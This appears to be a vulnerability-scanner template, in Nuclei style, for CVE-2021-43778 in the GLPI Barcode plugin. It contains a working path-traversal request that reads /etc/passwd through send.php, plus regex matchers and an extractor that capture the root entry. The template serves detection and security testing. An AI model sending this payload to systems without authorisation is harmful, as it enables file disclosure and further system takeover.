id: cve-2021-43778
info:
  name: GLPI Barcode Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The GLPI Barcode plug-in versions between v2.x-2.61 have arbitrary file reading vulnerabilities. Attackers can inject ../ to read all readable files on the affected device to further take over the system.
  tags: file-read
  reference:
    - https://github.com/pluginsGLPI/barcode/security/advisories/GHSA-2pjh-h828-wcw9

http:
  - raw:
      - |
        GET /glpi/plugins/barcode/front/send.php?file=../../../../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:(x*?):0:0:"
    extractors:
      - type: regex
        part: body
        regex:
          - "(root:.*?:0:0:.*?:.*?:.*?:.*?)"
